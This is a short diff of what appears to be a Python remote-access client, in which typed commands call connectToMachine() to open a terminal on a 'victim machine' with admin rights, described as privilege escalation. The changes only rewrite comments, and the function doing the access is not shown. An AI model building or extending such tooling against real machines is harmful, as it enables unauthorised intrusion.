@@ -65,15 +65,14 @@ while True:
 
     msgToSend = input("Enter your message: ")
 
-    ## NOT TESTED YET ##############################################
-    # This should create a new terminal that is connected to the victim machine
-    # If the correct account is chosen, this terminal will have admin privileges
+    # Creates a new terminal that is connected to the victim machine
+    # If the correct account is chosen, this terminal will have admin privileges (privilege escalation)
     if msgToSend == "help":
         print(help)
     elif msgToSend == "getaccess":
         connectToMachine()
     ################################################################
-    # Closes the socket and terminates the connection (hopefully) ##
+    # Closes the socket and terminates the connection #
     elif msgToSend == "terminate":
         s.close()
         break
